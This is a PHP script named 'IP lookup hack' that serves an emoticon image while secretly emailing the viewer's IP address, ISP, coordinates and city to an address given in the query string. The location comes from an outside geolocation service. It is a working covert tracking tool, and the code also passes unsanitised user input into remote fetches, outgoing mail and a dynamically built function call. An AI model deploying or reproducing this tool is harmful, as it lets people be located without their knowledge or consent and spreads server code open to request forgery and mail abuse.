<?php
  header('Content-type: image/png');

  $ip = $_GET['ip']; if($ip=='') $ip = $_SERVER['REMOTE_ADDR'];
  $mailto = $_GET['mailto']; if($mailto=='') $mailto = 0;
  $img = $_GET['img']; if($img=='') $img = 'http://ap2cu.com/tools/icomatics/emoticons/emotes/16/happy.png';
  $subject = $_GET['subject']; if($subject=='') $subject = 'IP lookup hack';

  if($mailto) {
    $geo=json_decode(file_get_contents('http://ap2cu.com/tools/geolocalisation/service/json/?ip='.$ip));
    $loc = $geo->address->location->details;

    $msg = '<h1>IP lookup hack</h1>';
    $msg .= '<br/><b>IP Address</b>: '.$geo->address->ip;
    $msg .= '<br/><b>Provider</b>: '.$geo->address->provider->isp.' (ISP), '.$geo->address->provider->organization.' (Organization), ';
    $msg .= '<br/><b>Coordinates</b>: Latitude, Longitude = '.$geo->address->location->coordinates->latitude.', '.$geo->address->location->coordinates->longitude;

    $msg .= '<br/><b>Country</b>: <img src="http://ap2cu.com/tools/icomatics/flags/?size=small&country='.$loc->country->code.'"/>'.$loc->country->name.' ('.$loc->country->code.')';
    
    if(isNotNull($loc->region))     $msg .= '<br/><b>Region</b>: '.$loc->region->name.' ('.$loc->region->code.')';
    if(isNotNull($loc->department)) $msg .= '<br/><b>Department</b>: '.$loc->department->name.' ('.$loc->department->code.')';
    if(isNotNull($loc->city))       $msg .= '<br/><b>City</b>: '.$loc->city->name.' ('.$loc->city->code.')';

    mb_send_mail($mailto,$subject,$msg,"From: me@ap2cu.com\r\nContent-type: text/html\r\n");
  }
  writeEmote($img);
  
  function isNotNull($var) {
    return $var->name != null && $var->name != "" && $var->name != "null" && $var->name != "(null)"
         || ( $var->code != null && $var->code != "" && $var->code != "null" && $var->code != "(null)" );
  }

  function writeEmote($img) {
    eregi("^.*\\.(\\w+)$",$img,$group);
    $func = 'imageCreateFrom'.strtoupper($group[1]);
    $image = $func($img);
    imageAlphaBlending($image, false);
    imageSaveAlpha($image, true);
    imagePNG($image);
    imageDestroy($image);
  }  
?>